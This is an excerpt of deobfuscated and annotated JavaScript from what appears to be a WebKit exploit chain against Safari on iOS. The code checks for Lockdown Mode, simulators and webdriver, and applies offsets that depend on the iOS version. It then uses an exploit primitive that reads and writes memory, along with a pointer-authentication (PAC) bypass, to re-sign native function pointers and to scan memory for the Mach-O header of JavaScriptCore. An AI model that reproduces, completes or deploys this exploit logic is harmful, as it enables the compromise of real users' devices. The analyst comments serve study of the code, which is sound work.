...
"14669ca3b1519ba2a8f40be287f646d4d7593eb0": () => {
     ...
     *   - `x` is the full export (used for x.Vt.ut() - likely a BigInt utility)
    ...
    const x = globalThis.obChTK.hPL3On("57620206d62079baad0e57e6d9ec93120c0f5247"),
        { N: G } = globalThis.obChTK.hPL3On("57620206d62079baad0e57e6d9ec93120c0f5247"),
    ...
    function checkLockdownMode() {
        let t = false;
        return undefined === platformState.isLockdownMode
            ? (
                "MacIntel" === platformState.platform &&
                    -1 === Object.getOwnPropertyNames(window).indexOf("TouchEvent") &&
                    (t = true),
                platformState.isLockdownMode = t
            )
            : (t = platformState.isLockdownMode),
            t;
    }
    ...
    /**
     * Apply version-specific offsets to platformState.offsets.
     *
     ...
     * cause the loop to break - meaning only entries with minVersion <= iosVersion
     * are merged in.
     *
    ...
    function applyVersionOffsets() {
        ...
        let n = Object.assign(platformState.offsets, t[0]);
        for (const r of t.slice(1)) {
            if (r.GFx77t > platformState.iosVersion) break;
            n = Object.assign(n, r);
        }
        platformState.offsets = n;
    }
     ...
     */
    r.Xn = function () {
        if (null === platformState.exploitPrimitive) throw new Error("");
     ...
     *
     * 1. If navigator.webdriver is true and allowWebdriver is false, throws an error.
     *    If allowWebdriver is true, resolves false (not lockdown).
     *
     ...
     *      lockdown is active
     *
     * Results are cached in platformState.lockdownResult.
     * Times out after 5000ms, defaulting to false.
     *
     * @returns {Promise<boolean>} true if Lockdown Mode is detected
     */
    r.Yn = async function () {
        console.log(`[PLATFORM] Detecting lockdown mode via IndexedDB...`);
        if (null !== platformState.lockdownResult) return platformState.lockdownResult;
        {
            const t = new Promise(function (t, n) {
                ...
                if (true === navigator.webdriver) {
                    if (!platformState.allowWebdriver) throw new Error("");
                    o(false);
            ...
            return (platformState.lockdownResult = await t), platformState.lockdownResult;
        }
    };
     ...
     * Results are cached in platformState.simulatorResult.
     *
     * @returns {Promise<boolean>} true if NOT a simulator
     */
    r.Hn = async function () {
        if (null !== platformState.simulatorResult) return platformState.simulatorResult;
        {
            const t = new Promise(function (t, n) {
                return t(
                    !(
            ...
            return (platformState.simulatorResult = await t), platformState.simulatorResult;
        }
    };
     ...
     *   1. Reads the JSObject pointer via exploitPrimitive.tr()
     *   2. Reads the native function pointer at JSObject + offsets.rvXShf
     *   3. Uses exploitPrimitive.rr() to read the raw pointer
     *   4. Extracts the data portion (o.Dt())
     *   5. Signs it with the PAC bypass (pacBypass.er()) using context 0x24AD
     ...
     */
    r.$n = async function () {
        if (undefined === platformState.exploitPrimitive) throw new Error("");
        if (undefined === platformState.pacBypass) throw new Error("");

        /** PAC signing context value: 0x24AD = 9389 */
        const t = x.Vt.ut(9389);

        function n(n) {
            const r = (function (t) {
                    const n = platformState.exploitPrimitive.tr(t);
                    return platformState.exploitPrimitive.nr(
                        n +
                            globalThis.obChTK.hPL3On(
                                "14669ca3b1519ba2a8f40be287f646d4d7593eb0"
                            ).zn.offsets.rvXShf
                    );
                })(n),
                o = platformState.exploitPrimitive.rr(r);
            return platformState.pacBypass.er(o.Dt(), t).lt(o);
        }
     ...
     *
     * @param {string} t - Telemetry string 1 (Tn)
     * @param {string} n - Telemetry string 2 (pn)
     * @param {string} r - Telemetry string 3 (Kn)
     * @param {boolean} o - Allow webdriver flag (En)
     * @param {boolean} e - Secondary flag (Pn / flag2)
     * @param {string} l - navigator.platform value
     * @param {string} i - navigator.userAgent string
     */
    r.init = function (t, n, r, o, e, l, i) {
        function c(t) {
        ...
        platformState.flag2 = e;
        platformState.platform = l;
        console.log(`[PLATFORM] Initializing platform detection...`);
        ...
        if ("safari" !== platformState.browserType) throw new Error("");
     ...
     *
     *   4. Stores the Mach-O header address as platformState.jscBase.
     *
     ...
     */
    r.lr = function () {
        console.log(`[PLATFORM] Detecting JSC runtime type...`);
        const t = (t) => {
                if (undefined === platformState.exploitPrimitive) throw new Error("");
                const n = platformState.exploitPrimitive.tr(t);
                return platformState.exploitPrimitive.rr(
                    n +
                        globalThis.obChTK.hPL3On(
                            "14669ca3b1519ba2a8f40be287f646d4d7593eb0"
                        ).zn.offsets.KaU4Z7
        ...
        if (n.et !== r.et) {
            ...
            console.log(`[PLATFORM] PAC (Pointer Authentication) detected`);
         ...
         * magic number 0xFEEDFACF. The ir() method reads a 32-bit value,
         * and we compare against the full 64-bit representation:
         * 4294967296 + (-17958193) = 0xFEEDFACF = 4277009103
         */
        while (0xFEEDFACF !== platformState.exploitPrimitive.ir(o)) {
            o = o.Bt(4096);
        }
     ...
     */
    r.cr = function () {
        console.log(`[PLATFORM] Creating image list from JSC base address...`);
        let t;
        if (platformState.machOParser) {
            t = platformState.machOParser;
        } else {
            if (!platformState.jscBase) throw new Error("");

            const n = globalThis.obChTK.hPL3On(
            ...
            if ("PSNMWj" === platformState.runtime) {
                ...
                if ("RoAZdq" !== platformState.runtime) throw new Error("");
                t = r.sr();
            }
